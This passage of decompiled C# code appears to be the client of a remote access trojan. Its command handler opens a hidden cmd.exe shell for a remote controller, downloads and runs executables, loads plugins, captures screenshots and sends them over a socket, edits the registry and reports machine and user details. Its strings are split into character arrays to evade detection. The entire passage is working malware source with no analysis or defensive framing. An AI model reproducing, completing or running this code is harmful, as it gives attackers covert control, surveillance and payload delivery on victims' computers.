            }
            object[] objArray3 = new object[1];
            obj5 = obj4;
            objArray3[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj5, null, "ToArray", new object[0], null, null, null));
            arguments = objArray3;
            copyBack = new bool[] { true };
            NewLateBinding.LateCall(instance, null, "Add", arguments, null, null, copyBack, true);
            if (copyBack[0])
            {
                NewLateBinding.LateSetComplex(obj5, null, "ToArray", new object[] { RuntimeHelpers.GetObjectValue(arguments[0]) }, null, null, true, false);
            }
            NewLateBinding.LateCall(obj3, null, "Dispose", new object[0], null, null, null, true);
            NewLateBinding.LateCall(obj4, null, "Dispose", new object[0], null, null, null, true);
            return (Array) NewLateBinding.LateGet(instance, null, "ToArray", new object[0], null, null, null);
        }

        public string method_19(ref byte[] byte_0)
        {
            return Encoding.Default.GetString(byte_0);
        }

        public void method_2(byte[] byte_0)
        {
            string[] strArray = Strings.Split(this.method_19(ref byte_0), (string) this.object_1, -1, CompareMethod.Binary);
            try
            {
                object[] objArray;
                bool flag;
                int num2;
                object[] objArray2;
                bool[] flagArray;
                object[] objArray3;
                string str10 = strArray[0];
                if (str10 == new string(new char[] { 'r', 's', 's' }))
                {
                    try
                    {
                        NewLateBinding.LateCall(this.object_12, null, "Kill", new object[0], null, null, null, true);
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        ProjectData.ClearProjectError();
                    }
                    this.object_12 = new Process();
                    NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.object_12, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardOutput", new object[] { true }, null, null, false, true);
                    NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.object_12, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardInput", new object[] { true }, null, null, false, true);
                    NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.object_12, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardError", new object[] { true }, null, null, false, true);
                    NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.object_12, null, "StartInfo", new object[0], null, null, null), null, "FileName", new object[] { new char[] { 'c', 'm', 'd', '.', 'e', 'x', 'e' } }, null, null, false, true);
                    NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.object_12, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardError", new object[] { true }, null, null, false, true);
                    ((Process) this.object_12).OutputDataReceived += new DataReceivedEventHandler(this.method_5);
                    ((Process) this.object_12).ErrorDataReceived += new DataReceivedEventHandler(this.method_5);
                    ((Process) this.object_12).Exited += new EventHandler(this.method_25);
                    NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.object_12, null, "StartInfo", new object[0], null, null, null), null, "UseShellExecute", new object[] { false }, null, null, false, true);
                    NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.object_12, null, "StartInfo", new object[0], null, null, null), null, "CreateNoWindow", new object[] { true }, null, null, false, true);
                    NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.object_12, null, "StartInfo", new object[0], null, null, null), null, "WindowStyle", new object[] { ProcessWindowStyle.Hidden }, null, null, false, true);
                    NewLateBinding.LateSet(this.object_12, null, "EnableRaisingEvents", new object[] { true }, null, null);
                    this.method_8(new string(new char[] { 'r', 's', 's' }));
                    NewLateBinding.LateCall(this.object_12, null, "Start", new object[0], null, null, null, true);
                    NewLateBinding.LateCall(this.object_12, null, "BeginErrorReadLine", new object[0], null, null, null, true);
                    NewLateBinding.LateCall(this.object_12, null, "BeginOutputReadLine", new object[0], null, null, null, true);
                    return;
                }
                if (str10 == new string(new char[] { 'r', 's' }))
                {
                    NewLateBinding.LateCall(NewLateBinding.LateGet(this.object_12, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[] { this.method_23(ref strArray[1]) }, null, null, null, true);
                    return;
                }
                if (str10 == new string(new char[] { 'r', 's', 'c' }))
                {
                    try
                    {
                        NewLateBinding.LateCall(this.object_12, null, "Kill", new object[0], null, null, null, true);
                    }
                    catch (Exception exception6)
                    {
                        ProjectData.SetProjectError(exception6);
                        ProjectData.ClearProjectError();
                    }
                    this.object_12 = null;
                    return;
                }
                if (str10 == new string(new char[] { 'k', 'l' }))
                {
                    this.method_8(new string(new char[] { 'k', 'l' }) + ((string) this.object_1) + this.method_24(ref (string) ref this.object_8.object_2));
                    return;
                }
                if (str10 == new string(new char[] { 'i', 'n', 'f' }))
                {
                    string str = new string(new char[] { 'i', 'n', 'f' }) + ((string) this.object_1);
                    if (this.method_29("vn") == "")
                    {
                        str = str + this.method_24(ref this.method_23(ref (string) ref this.object_19) + new string(new char[] { '_' }) + this.method_9()) + ((string) this.object_1);
                    }
                    else
                    {
                        str = str + this.method_24(ref this.method_23(ref this.method_29("vn")) + "_" + this.method_9()) + ((string) this.object_1);
                    }
                    str = (((str + this.object_4 + new string(new char[] { ':' }) + this.object_2 + this.object_1) + ((string) this.object_9) + ((string) this.object_1)) + ((string) this.object_11) + ((string) this.object_1)) + Process.GetCurrentProcess().ProcessName;
                    this.method_8(str);
                    return;
                }
                if (str10 == new string(new char[] { 'p', 'r', 'o', 'f' }))
                {
                    string str13 = strArray[1];
                    if (str13 == new string(new char[] { '~' }))
                    {
                        this.method_28(strArray[2], strArray[3]);
                    }
                    else if (str13 == new string(new char[] { '!' }))
                    {
                        this.method_28(strArray[2], strArray[3]);
                        this.method_8(new string(new char[] { 'g', 'e', 't', 'v', 'a', 'l', 'u', 'e' }) + this.object_1 + strArray[1] + this.object_1 + this.method_29(strArray[1]));
                    }
                    else if (str13 == new string(new char[] { '~' }))
                    {
                        this.method_31(strArray[2]);
                    }
                    return;
                }
                if (str10 == new string(new char[] { 'r', 'n' }))
                {
                    byte[] buffer = null;
                    if (!strArray[2].ToLower().StartsWith(new string(new char[] { 'h', 't', 't', 'p' })))
                    {
                        flag = false;
                        buffer = this.method_17(Convert.FromBase64String(strArray[2]), ref flag);
                    }
                    else
                    {
                        object instance = new WebClient();
                        objArray = new object[1];
                        num2 = 2;
                        objArray[0] = strArray[2];
                        objArray2 = objArray;
                        flagArray = new bool[] { true };
                        if (flagArray[0])
                        {
                            strArray[num2] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof(string));
                        }
                        buffer = (byte[]) NewLateBinding.LateGet(instance, null, "DownloadData", objArray2, null, null, flagArray);
                    }
                    this.method_8(new string(new char[] { 'b', 'l', 'a' }));
                    string str2 = Interaction.Environ("temp") + @"\" + this.method_22(10) + "." + strArray[1];
                    System.IO.File.WriteAllBytes(str2, buffer);
                    Process.Start(str2);
                    return;
                }
                if (str10 == new string(new char[] { 'i', 'n', 'v' }))
                {
                    byte[] buffer2;
                    this.method_8(new string(new char[] { 'b', 'l', 'a' }));
                    string s = this.method_29(strArray[1]);
                    if (s.Length > 0)
                    {
                        buffer2 = Convert.FromBase64String(s);
                        this.method_8(new string(new char[] { 'p', 'l' }) + this.object_1 + strArray[1] + this.object_1 + Conversions.ToString(0));
                    }
                    else
                    {
                        if (strArray[3].Length == 1)
                        {
                            this.method_8("pl" + this.object_1 + strArray[1] + this.object_1 + "False");
                            return;
                        }
                        flag = false;
                        buffer2 = this.method_17(Convert.FromBase64String(strArray[3]), ref flag);
                        if (Conversions.ToBoolean(this.method_28(strArray[1], Convert.ToBase64String(buffer2))))
                        {
                            this.method_8(new string(new char[] { 'p', 'l' }) + this.object_1 + strArray[1] + this.object_1 + Conversions.ToString(0));
                        }
                    }
                    object objectValue = RuntimeHelpers.GetObjectValue(this.method_6(buffer2, new string(new char[] { 'A' })));
                    NewLateBinding.LateSet(objectValue, null, "h", new object[] { this.object_4 }, null, null);
                    NewLateBinding.LateSet(objectValue, null, "p", new object[] { this.object_2 }, null, null);
                    NewLateBinding.LateSet(objectValue, null, "osk", new object[] { strArray[2] }, null, null);
                    NewLateBinding.LateCall(objectValue, null, "start", new object[0], null, null, null, true);
                    while (!Conversions.ToBoolean(Operators.OrObject(this.object_14 == 0, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, null, "Off", new object[0], null, null, null), true, false))))
                    {
                        Thread.Sleep(1);
                    }
                    NewLateBinding.LateSet(objectValue, null, "off", new object[] { true }, null, null);
                    return;
                }
                if (str10 == new string(new char[] { 'r', 'e', 't' }))
                {
                    byte[] buffer3;
                    this.method_8(new string(new char[] { 'b', 'l', 'a' }));
                    string str4 = this.method_29(strArray[1]);
                    if (str4.Length > 0)
                    {
                        buffer3 = Convert.FromBase64String(str4);
                        this.method_8(new string(new char[] { 'p', 'l' }) + this.object_1 + strArray[1] + this.object_1 + Conversions.ToString(0));
                    }
                    else
                    {
                        if (strArray[2].Length == 1)
                        {
                            this.method_8("pl" + this.object_1 + strArray[1] + this.object_1 + "True");
                            return;
                        }
                        flag = false;
                        buffer3 = this.method_17(Convert.FromBase64String(strArray[2]), ref flag);
                        if (Conversions.ToBoolean(this.method_28(strArray[1], Convert.ToBase64String(buffer3))))
                        {
                            this.method_8(new string(new char[] { 'p', 'l' }) + this.object_1 + strArray[1] + this.object_1 + Conversions.ToString(0));
                        }
                    }
                    object obj4 = RuntimeHelpers.GetObjectValue(this.method_6(buffer3, new string(new char[] { 'A' })));
                    this.method_8(new string(new char[] { 'r', 'e', 't' }) + this.object_1 + strArray[1] + this.object_1 + this.method_24(ref Conversions.ToString(NewLateBinding.LateGet(obj4, null, "GT", new object[0], null, null, null))));
                    return;
                }
                if (str10 == new string(new char[] { 'C', 'A', 'P' }))
                {
                    IntPtr ptr;
                    Rectangle bounds = Screen.PrimaryScreen.Bounds;
                    Bitmap image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, bounds.Height);
                    Graphics g = Graphics.FromImage(image);
                    Size blockRegionSize = new Size(image.Width, image.Height);
                    g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
                    try
                    {
                        blockRegionSize = new Size(0x20, 0x20);
                        bounds = new Rectangle(Cursor.Position, blockRegionSize);
                        Cursors.Default.Draw(g, bounds);
                    }
                    catch (Exception exception7)
                    {
                        ProjectData.SetProjectError(exception7);
                        ProjectData.ClearProjectError();
                    }
                    g.Dispose();
                    MemoryStream stream = new MemoryStream();
                    byte_0 = this.method_20(ref new string(new char[] { 'C', 'A', 'P' }) + ((string) this.object_1));
                    stream.Write(byte_0, 0, byte_0.Length);
                    MemoryStream stream2 = new MemoryStream();
                    image.GetThumbnailImage(Conversions.ToInteger(strArray[1]), Conversions.ToInteger(strArray[2]), null, ptr).Save(stream2, ImageFormat.Jpeg);
                    stream.Write(stream2.ToArray(), 0, (int) stream2.Length);
                    this.method_3(stream.ToArray());
                    stream.Dispose();
                    stream2.Dispose();
                    image.Dispose();
                    return;
                }
                if (str10 == new string(new char[] { 'P' }))
                {
                    this.method_8(new string(new char[] { 'P' }));
                    return;
                }
                if (str10 == new string(new char[] { 'u', 'n' }))
                {
                    string str14 = strArray[1];
                    if (str14 == new string(new char[] { '~' }))
                    {
                        this.method_12();
                    }
                    else if (str14 == new string(new char[] { '!' }))
                    {
                        this.method_0(0);
                        ProjectData.EndApp();
                    }
                    else if (str14 == new string(new char[] { '@' }))
                    {
                        this.method_0(0);
                        objArray2 = new object[1];
                        object obj7 = this.object_10;
                        objArray2[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj7, null, "FullName", new object[0], null, null, null));
                        objArray = objArray2;
                        flagArray = new bool[] { true };
                        NewLateBinding.LateCall(null, typeof(Process), "Start", objArray, null, null, flagArray, true);
                        if (flagArray[0])
                        {
                            NewLateBinding.LateSetComplex(obj7, null, "FullName", new object[] { RuntimeHelpers.GetObjectValue(objArray[0]) }, null, null, true, false);
                        }
                        ProjectData.EndApp();
                    }
                    return;
                }
                if (str10 != new string(new char[] { 'u', 'p' }))
                {
                    goto Label_137F;
                }
                byte[] bytes = null;
                if (!strArray[1].ToLower().StartsWith(new string(new char[] { 'h', 't', 't', 'p' })))
                {
                    flag = false;
                    bytes = this.method_17(Convert.FromBase64String(strArray[1]), ref flag);
                }
                else
                {
                    object obj5 = new WebClient();
                    objArray3 = new object[1];
                    num2 = 1;
                    objArray3[0] = strArray[1];
                    objArray2 = objArray3;
                    flagArray = new bool[] { true };
                    if (flagArray[0])
                    {
                        strArray[num2] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof(string));
                    }
                    bytes = (byte[]) NewLateBinding.LateGet(obj5, null, "DownloadData", objArray2, null, null, flagArray);
                }
                this.method_8(new string(new char[] { 'b', 'l', 'a' }));
                NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "SetValue", new object[] { "di", "" }, null, null, null, true);
                string path = Interaction.Environ("temp") + @"\" + this.method_22(10) + ".exe";
                System.IO.File.WriteAllBytes(path, bytes);
                Process.Start(path, new string(new char[] { 'U', 'P', ':' }) + Conversions.ToString(Process.GetCurrentProcess().Id));
                int num = 0;
                goto Label_1309;
            Label_12F0:
                num++;
                if (num <= 500)
                {
                    goto Label_1309;
                }
                return;
            Label_1301:
                this.method_12();
                goto Label_12F0;
            Label_1309:
                Thread.Sleep(10);
                if (!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "GetValue", new object[] { "di", "" }, null, null, null), "!", false))
                {
                    goto Label_12F0;
                }
                goto Label_1301;
            Label_137F:;
                if (str10 == new string(new char[] { 'R', 'G' }))
                {
                    object[] objArray4;
                    bool[] flagArray2;
                    object obj6 = this.method_1(strArray[2]);
                    string str15 = strArray[1];
                    if (str15 == new string(new char[] { '~' }))
                    {
                        IEnumerator enumerator;
                        IEnumerator enumerator2;
                        string str7 = "RG" + this.object_1 + "~" + this.object_1 + strArray[2] + this.object_1;
                        string str6 = "";
                        try
                        {
                            enumerator = ((IEnumerable) NewLateBinding.LateGet(obj6, null, "GetSubKeyNames", new object[0], null, null, null)).GetEnumerator();
                            while (enumerator.MoveNext())
                            {
                                string str8 = Conversions.ToString(enumerator.Current);
                                if (!str8.Contains(new string(new char[] { '\\' })))
                                {
                                    str6 = str6 + str8 + ((string) this.object_1);
                                }
                            }
                        }
                        finally
                        {
                            if (enumerator is IDisposable)
                            {
                                (enumerator as IDisposable).Dispose();
                            }
                        }
                        try
                        {
                            enumerator2 = ((IEnumerable) NewLateBinding.LateGet(obj6, null, "GetValueNames", new object[0], null, null, null)).GetEnumerator();
                            while (enumerator2.MoveNext())
                            {
                                string str9 = Conversions.ToString(enumerator2.Current);
                                string[] strArray2 = new string[7];
                                strArray2[0] = str6;
                                strArray2[1] = str9;
                                strArray2[2] = "/";
                                objArray4 = new object[] { str9 };
                                flagArray2 = new bool[] { true };
                                if (flagArray2[0])
                                {
                                    str9 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4[0]), typeof(string));
                                }
                                strArray2[3] = NewLateBinding.LateGet(obj6, null, "GetValueKind", objArray4, null, null, flagArray2).ToString();
                                strArray2[4] = "/";
                                objArray2 = new object[] { str9, "" };
                                flagArray = new bool[] { true, false };
                                if (flagArray[0])
                                {
                                    str9 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof(string));
                                }
                                strArray2[5] = NewLateBinding.LateGet(obj6, null, "GetValue", objArray2, null, null, flagArray).ToString();
                                strArray2[6] = (string) this.object_1;
                                str6 = string.Concat(strArray2);
                            }
                        }
                        finally
                        {
                            if (enumerator2 is IDisposable)
                            {
                                (enumerator2 as IDisposable).Dispose();
                            }
                        }
                        this.method_8(str7 + str6);
                    }
                    else
                    {
                        int num4;
                        if (str15 == new string(new char[] { '!' }))
                        {
                            objArray4 = new object[3];
                            num2 = 3;
                            objArray4[0] = strArray[3];
                            int index = 4;
                            objArray4[1] = strArray[4];
                            num4 = 5;
                            objArray4[2] = strArray[5];
                            objArray3 = objArray4;
                            flagArray2 = new bool[] { true, true, true };
                            NewLateBinding.LateCall(obj6, null, "SetValue", objArray3, null, null, flagArray2, true);
                            if (flagArray2[0])
                            {
                                strArray[num2] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof(string));
                            }
                            if (flagArray2[1])
                            {
                                strArray[index] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[1]), typeof(string));
                            }
                            if (flagArray2[2])
                            {
                                strArray[num4] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[2]), typeof(string));
                            }
                        }
                        else if (str15 == new string(new char[] { '@' }))
                        {
                            objArray4 = new object[2];
                            num4 = 3;
                            objArray4[0] = strArray[3];
                            objArray4[1] = false;
                            objArray3 = objArray4;
                            flagArray2 = new bool[] { true, false };
                            NewLateBinding.LateCall(obj6, null, "DeleteValue", objArray3, null, null, flagArray2, true);
                            if (flagArray2[0])
                            {
                                strArray[num4] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof(string));
                            }
                        }
                        else if (str15 == new string(new char[] { '#' }))
                        {
                            objArray4 = new object[1];
                            num4 = 3;
                            objArray4[0] = strArray[3];
                            objArray3 = objArray4;
                            flagArray2 = new bool[] { true };
                            NewLateBinding.LateCall(obj6, null, "CreateSubKey", objArray3, null, null, flagArray2, true);
                            if (flagArray2[0])
                            {
                                strArray[num4] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof(string));
                            }
                        }
                        else if (str15 == new string(new char[] { '$' }))
                        {
                            objArray4 = new object[1];
                            num4 = 3;
                            objArray4[0] = strArray[3];
                            objArray3 = objArray4;
                            flagArray2 = new bool[] { true };
                            NewLateBinding.LateCall(obj6, null, "DeleteSubKeyTree", objArray3, null, null, flagArray2, true);
                            if (flagArray2[0])
                            {
                                strArray[num4] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof(string));
                            }
                        }
                    }
                }
            }
            catch (Exception exception8)
            {
                ProjectData.SetProjectError(exception8);
                Exception exception4 = exception8;
                try
                {
                    this.method_8(new string(new char[] { 'E', 'R' }) + this.object_1 + strArray[0] + this.object_1 + exception4.Message);
                    if ((strArray[0] == "up") | (strArray[0] == "rn"))
                    {
                        this.method_8(new string(new char[] { 'b', 'l', 'a' }));
                    }
                }
                catch (Exception exception9)
                {
                    ProjectData.SetProjectError(exception9);
                    ProjectData.ClearProjectError();
                }
                ProjectData.ClearProjectError();
            }
        }

        public byte[] method_20(ref string string_0)
        {
            return Encoding.Default.GetBytes(string_0);
        }

        [CompilerGenerated, DebuggerStepThrough]
        private void method_21(object sender, SessionEndingEventArgs e)
        {
            this.method_7();
        }

        public string method_22(int int_0)
        {
            VBMath.Randomize();
            Random random = new Random();
            string str3 = "";
            string str = new string(new char[] { 
                'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 
                'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'
             });
            int num2 = int_0;
            for (int i = 1; i <= num2; i++)
            {
                str3 = str3 + Conversions.ToString(str[random.Next(0, str.Length)]);
            }
            return str3;
        }

        public string method_23(ref string string_0)
        {
            byte[] bytes = Convert.FromBase64String(string_0);
            return Encoding.UTF8.GetString(bytes);
        }

        public string method_24(ref string string_0)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(string_0));
        }

        [DebuggerStepThrough, CompilerGenerated]
        private void method_25(object sender, EventArgs e)
        {
            this.method_4();
        }

        public string method_26()
        {
            string str;
            try
            {
                str = ((FileInfo) this.object_10).LastWriteTime.ToString(new string(new char[] { 'y', 'y', 'y', 'y', '-', 'M', 'M', '-', 'd', 'd' }));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                str = new string(new char[] { 'u', 'n', 'k', 'n', 'o', 'w', 'n' });
                ProjectData.ClearProjectError();
            }
            return str;
        }

        public string method_27()
        {
            string left = new string(new char[] { 'l', 'v' }) + ((string) this.object_1);
            try
            {
                if (this.method_29("vn") == "")
                {
                    left = left + this.method_24(ref this.method_23(ref (string) ref this.object_19) + new string(new char[] { '_' }) + this.method_9()) + ((string) this.object_1);
                }
                else
                {
                    left = left + this.method_24(ref this.method_23(ref this.method_29("vn")) + "_" + this.method_9()) + ((string) this.object_1);
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                left = left + this.method_24(ref this.method_9()) + ((string) this.object_1);
                ProjectData.ClearProjectError();
            }
            try
            {
                left = left + Environment.MachineName + ((string) this.object_1);
            }
            catch (Exception exception9)
            {
                ProjectData.SetProjectError(exception9);
                left = left + new string(new char[] { '?', '?' }) + ((string) this.object_1);
                ProjectData.ClearProjectError();
            }
            try
            {
                left = left + Environment.UserName + ((string) this.object_1);
            }
            catch (Exception exception10)
            {
                ProjectData.SetProjectError(exception10);
                left = left + new string(new char[] { '?', '?' }) + ((string) this.object_1);
                ProjectData.ClearProjectError();
            }
            left = left + this.method_26() + ((string) this.object_1);
            try
            {
                left = left + this.method_13(7) + ((string) this.object_1);
            }
            catch (Exception exception11)
            {
                ProjectData.SetProjectError(exception11);
                left = left + new string(new char[] { 'X' }) + ((string) this.object_1);
                ProjectData.ClearProjectError();
            }
            try
            {
                left = Conversions.ToString(Operators.AddObject(left, NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Info", new object[0], null, null, null), null, "OSFullName", new object[0], null, null, null), null, "Replace", new object[] { "Microsoft", "" }, null, null, null), null, "Replace", new object[] { "Windows", "Win" }, null, null, null), null, "Replace", new object[] { "\x00ae", "" }, null, null, null), null, "Replace", new object[] { "™", "" }, null, null, null), null, "Replace", new object[] { "  ", " " }, null, null, null), null, "Replace", new object[] { " Win", "Win" }, null, null, null)));
            }
            catch (Exception exception12)
            {
                ProjectData.SetProjectError(exception12);
                left = left + new string(new char[] { '?', '?' });
                ProjectData.ClearProjectError();
            }
            left = left + new string(new char[] { 'S', 'P' });
            try
            {
                string[] strArray = Strings.Split(Environment.OSVersion.ServicePack, new string(new char[] { ' ' }), -1, CompareMethod.Binary);
                if (strArray.Length == 1)
                {
                    left = left + new string(new char[] { '0' });
                }
                left = left + strArray[strArray.Length - 1];
            }
            catch (Exception exception13)
            {
                ProjectData.SetProjectError(exception13);
                left = left + new string(new char[] { '0' });
                ProjectData.ClearProjectError();
            }
            try
            {
                if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains(new string(new char[] { 'x', '8', '6' })))
                {
                    left = left + new string(new char[] { ' ', 'x', '6', '4' }) + ((string) this.object_1);
                }
                else
                {
                    left = left + new string(new char[] { ' ', 'x', '8', '6' }) + ((string) this.object_1);
                }
            }
            catch (Exception exception14)
            {
                ProjectData.SetProjectError(exception14);
                left = left + ((string) this.object_1);
                ProjectData.ClearProjectError();
            }
            if (this.method_14())
            {
                left = left + new string(new char[] { 'Y', 'e', 's' }) + ((string) this.object_1);
            }
            else
            {
                left = left + new string(new char[] { 'N', 'o' }) + ((string) this.object_1);
            }
            left = ((left + ((string) this.object_17) + ((string) this.object_1)) + new string(new char[] { '.', '.' }) + ((string) this.object_1)) + this.method_10() + ((string) this.object_1);
            string str3 = "";
            try
            {
                IEnumerator enumerator;
                try
                {
                    enumerator = ((IEnumerable) NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "CreateSubKey", new object[] { new string(new char[] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + ((string) this.object_6), false }, null, null, null), null, "GetValueNames", new object[0], null, null, null)).GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        string str4 = Conversions.ToString(enumerator.Current);
                        if (str4.Length == 0x20)
                        {
                            str3 = str3 + str4 + new string(new char[] { ',' });
                        }
                    }
                }
                finally
                {
                    if (enumerator is IDisposable)
                    {
                        (enumerator as IDisposable).Dispose();
                    }
                }
            }
            catch (Exception exception15)
            {
                ProjectData.SetProjectError(exception15);
                ProjectData.ClearProjectError();
            }
            return (left + str3);
        }

        public object method_28(string string_0, string string_1)
        {
            object obj2;
            try
            {
                object[] arguments = new object[] { string_0, string_1 };
                bool[] copyBack = new bool[] { true, true };
                NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "CreateSubKey", new object[] { new string(new char[] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + ((string) this.object_6) }, null, null, null), null, "SetValue", arguments, null, null, copyBack, true);
                if (copyBack[0])
                {
                    string_0 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(string));
                }
                if (copyBack[1])
                {
                    string_1 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[1]), typeof(string));
                }
                obj2 = true;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                obj2 = false;
                ProjectData.ClearProjectError();
            }
            return obj2;
        }

        public string method_29(string string_0)
        {
            string str;
            try
            {
                object[] arguments = new object[] { string_0, "" };
                bool[] copyBack = new bool[] { true, false };
                if (copyBack[0])
                {
                    string_0 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(string));
                }
                str = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "CreateSubKey", new object[] { @"Software\" + ((string) this.object_6) }, null, null, null), null, "GetValue", arguments, null, null, copyBack));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                str = "";
                ProjectData.ClearProjectError();
            }
            return str;
        }

        public void method_3(byte[] byte_0)
        {
            if (this.object_14 != null)
            {
                try
                {
                    object instance = new MemoryStream();
                    object[] arguments = new object[] { byte_0, 0, byte_0.Length };
                    bool[] copyBack = new bool[] { true, false, false };
                    NewLateBinding.LateCall(instance, null, "Write", arguments, null, null, copyBack, true);
                    if (copyBack[0])
                    {
                        byte_0 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(byte[]));
                    }
                    NewLateBinding.LateCall(instance, null, "Write", new object[] { this.method_20(ref (string) ref this.object_7), 0, this.object_7.Length }, null, null, null, true);
                    arguments = new object[4];
                    object obj3 = instance;
                    arguments[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, null, "ToArray", new object[0], null, null, null));
                    arguments[1] = 0;
                    object obj4 = instance;
                    arguments[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, null, "Length", new object[0], null, null, null));
                    arguments[3] = SocketFlags.None;
                    object[] objArray = arguments;
                    copyBack = new bool[] { true, false, true, false };
                    NewLateBinding.LateCall(NewLateBinding.LateGet(this.object_16, null, "Client", new object[0], null, null, null), null, "Send", objArray, null, null, copyBack, true);
                    if (copyBack[0])
                    {
                        NewLateBinding.LateSetComplex(obj3, null, "ToArray", new object[] { RuntimeHelpers.GetObjectValue(objArray[0]) }, null, null, true, false);
                    }
                    if (copyBack[2])
                    {
                        NewLateBinding.LateSetComplex(obj4, null, "Length", new object[] { RuntimeHelpers.GetObjectValue(objArray[2]) }, null, null, true, false);
                    }
                    NewLateBinding.LateCall(instance, null, "Dispose", new object[0], null, null, null, true);
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    this.object_14 = 0;
                    ProjectData.ClearProjectError();
                }
            }
        }

        [DebuggerStepThrough, CompilerGenerated]
        private void method_30(object object_21)
        {
            this.method_2((byte[]) object_21);
        }

        public void method_31(string string_0)
        {
            try
            {
                object[] arguments = new object[] { string_0 };
                bool[] copyBack = new bool[] { true };
                NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "CreateSubKey", new object[] { new string(new char[] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + ((string) this.object_6) }, null, null, null), null, "DeleteValue", arguments, null, null, copyBack, true);
                if (copyBack[0])
                {
                    string_0 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(string));
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public void method_32()
        {
            this.object_15 = this.object_6;
            if ((Interaction.Command() != null) && (Interaction.Command().Length > 0))
            {
                string[] strArray = Strings.Split(Interaction.Command(), new string(new char[] { ':' }), -1, CompareMethod.Binary);
                string str2 = strArray[0];
                if (str2 == new string(new char[] { 'U', 'P' }))
                {
                    try
                    {
                        NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "SetValue", new object[] { "di", "!" }, null, null, null, true);
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        ProjectData.ClearProjectError();
                    }
                    try
                    {
                        object processById = Process.GetProcessById(Conversions.ToInteger(strArray[1]));
                        NewLateBinding.LateCall(processById, null, "WaitForExit", new object[] { 0x1388 }, null, null, null, true);
                        try
                        {
